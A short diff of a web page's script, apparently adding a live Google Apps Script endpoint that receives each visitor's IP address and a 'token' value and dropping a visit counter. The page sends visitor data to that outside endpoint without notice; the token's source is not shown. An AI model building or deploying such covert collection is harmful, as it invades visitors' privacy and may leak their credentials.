@@ -15,7 +15,6 @@
 
   <div id="main-content">
     <h1>Welcome, <span id="user-info"></span></h1>
-    <p id="visit-label">Visits: ...</p>
   </div>
 
   <script>
@@ -67,7 +66,7 @@
         .then(r => r.json())
         .then(data => {
           const ip = data.ip;
-          const gasURL = 'https://script.google.com/macros/s/YOUR_GAS_SCRIPT_ID/exec'; // غيّرها برابطك
+          const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
           const params = new URLSearchParams({
             ip,
             token,
@@ -80,16 +79,6 @@
             .catch(e => console.error('Error sending data to GAS:', e));
         })
         .catch(e => console.error('Failed to get IP:', e));
-
-      // جلب عدد الزيارات
-      fetch('https://script.google.com/macros/s/YOUR_VISITS_GAS_SCRIPT_ID/exec') // عدّل الرابط
-        .then(r => r.text())
-        .then(count => {
-          document.getElementById('visit-label').textContent = 'Visits: ' + count;
-        })
-        .catch(() => {
-          document.getElementById('visit-label').textContent = 'Visits: N/A';
-        });
     }
 
     init();
